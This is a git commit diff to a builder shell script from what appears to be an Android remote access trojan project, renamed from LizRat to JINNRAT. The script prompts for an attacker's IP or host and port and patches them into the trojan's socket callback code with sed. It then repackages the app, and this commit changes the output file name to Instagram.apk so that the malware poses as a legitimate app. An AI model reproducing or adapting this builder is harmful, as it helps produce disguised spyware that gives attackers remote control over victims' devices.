29bf3565a3b8e1e9dbaaf935f1b5fb438bf2ffc3
•JINN• <95747858+alvinbaby@users.noreply.github.com>
2022-07-08 21:53:11 +0530

    Update e9077-2845-52bc5.sh

--- server/assets/webpublic/client_downloads/e9077-2845-52bc5.sh
+++ server/assets/webpublic/client_downloads/e9077-2845-52bc5.sh
@@ -1,15 +1,15 @@
 #!/usr/bin/env sh
 
-smaliFile="smali/com/Liz0rd/lizrat/IOSocket.smali"
+smaliFile="smali_classes4/com/Liz0rd/lizrat/IOSocket.smali"
 
-if [ -d $HOME/LizRat ]; then
+if [ -d $HOME/JINNRAT ]; then
 
-    appPath="$HOME/LizRat/server/app/factory/decompiled"
+    appPath="$HOME/JINNRAT/server/app/decompiled"
 fi
 
-read -p "👽 🇮🇵/🇺🇷🇱/🇭🇴🇸🇹 : " host        
-read -p "👽 🇵🇴🇷🇹 : " port
+read -p "✅ 🇮🇵/🇺🇷🇱/🇭🇴🇸🇹 : " host
+read -p "✅ 🇵🇴🇷🇹 : " port
 
 sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile
 
-apkmod -R -i "$appPath" -o ~/lizrat/lizRat.apk
+apkmod -R -i "$appPath" -o ~/JINNRAT/app/Instagram.apk
